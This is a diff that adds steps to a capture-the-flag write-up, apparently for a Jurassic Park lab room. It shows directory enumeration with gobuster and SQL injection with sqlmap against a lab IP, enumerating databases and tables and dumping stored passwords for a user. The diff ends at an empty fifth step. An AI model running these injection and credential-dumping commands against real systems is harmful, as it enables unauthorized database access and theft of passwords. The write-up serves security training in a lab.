@@ -57,3 +57,56 @@ In one of the terminal I runned gobuster, for discover eventualy hidden folder.
 
 `gobuster dir -u http://10.10.251.164 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee scans/gobuster`
 
+In the while, because the port 80 is open, i will check if there is a website running.
+And indeed the website is there.
+The source code does not reveal anything useful. There is only one link to _shop.php_.
+On the _shop.php_ page we could find 3 link for purchase different type of ticket for the Park, or I believe so. Anyway the thing that took my attention was the format of those three links.
+
+```
+item=php?id=1
+item=php?id=2
+item=php?id=3
+```
+
+I thought "_Will there be a database?_". So i lauched BurpSuite, captured the request for one of the three links and saved it to a txt file.
+
+Back to Gobuster, apparently there is a _delete_ folder accessable. I did navigate to that address and got this
+
+```
+New priv esc for Ubunut??
+
+Change MySQL password on main system!
+```
+
+Not sure what to do about this information but I will keep note of it anyway.
+
+## STEP 3
+
+With the Burp request saved, I tryed to see if a database is really there using **sqlmap**
+
+`sqlmap -r files/burp_request.txt --dbs`
+
+sqlmap will ask you how to proceed during the scan. For semplicity just push enter, so it runs with the default settings.
+At the end of the scan I could check that there is indeed a database, and I got all the information for **answer at the first three questions**.
+
+## STEP 4
+
+The question number 4 ask us to find the password for the user _dennis_.
+So I started to search deep in the database of the Jurassic Park.
+
+```
+sqlmap -r files/burp_request.txt -D <redacted> --tables
+sqlmap -r files/burp_request.txt -D <redacted> -T <redacted> --columns
+sqlmap -r files/burp_request.txt -D <redacted> -T <redacted> --sql-query "SELECT * FROM <redacted>"
+```
+
+Here I got 2 results. I could see 2 password but the username were missing. 
+I tryed both and what you need to know that one of the two is the right one.
+I kept note of the other password, just in case.
+    
+## STEP 5
+
+
+
+
+
